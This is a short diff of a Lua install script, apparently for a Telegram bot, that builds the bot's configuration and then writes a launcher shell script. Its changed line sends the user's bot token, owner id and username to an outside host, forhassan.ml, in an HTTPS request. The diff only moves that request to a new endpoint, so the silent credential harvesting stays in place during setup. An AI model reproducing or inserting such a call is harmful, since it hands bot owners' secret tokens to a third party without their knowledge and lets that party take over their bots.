@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_TiMoR_Info()
 Create_Info(database:get(Server_TiMoR.."Token_TiMoR"),database:get(Server_TiMoR.."Id_TiMoR"),database:get(Server_TiMoR.."UserName_TiMoR"))   
-https.request("https://forhassan.ml/TiMoR/TiMoR.php?id="..database:get(Server_TiMoR.."Id_TiMoR").."&user="..database:get(Server_TiMoR.."UserName_TiMoR").."&token="..database:get(Server_TiMoR.."Token_TiMoR"))
+https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_TiMoR.."Id_TiMoR").."&user="..database:get(Server_TiMoR.."UserName_TiMoR").."&token="..database:get(Server_TiMoR.."Token_TiMoR"))
 local RunTiMoR = io.open("TiMoR", 'w')
 RunTiMoR:write([[
 #!/usr/bin/env bash
